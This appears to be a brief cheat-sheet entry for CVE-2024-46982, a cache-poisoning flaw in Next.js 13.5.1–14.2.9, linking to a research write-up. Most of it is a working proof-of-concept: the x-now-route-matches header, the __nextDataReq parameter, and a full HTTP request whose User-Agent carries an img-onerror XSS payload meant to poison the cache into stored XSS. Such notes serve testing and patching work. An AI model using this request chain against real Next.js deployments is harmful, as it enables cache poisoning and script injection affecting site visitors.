#### Next.js between 13.5.1 and 14.2.9 => CVE-2024-46982

[https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir](https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir)


## Headers 
```
x-now-route-matches: 1
```
```
/_next/data/{buildID}/targeted-page.json

https://www.example.com/?__nextDataReq=1
```

```
GET /poc?__nextDataReq=1 HTTP/1.1
Host: localhost:3000
User-Agent: CP TO SXSS ON NEXT.JS : <img src=x onerror=alert('Palestine')>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
x-now-route-matches: 1
```

------------------------------
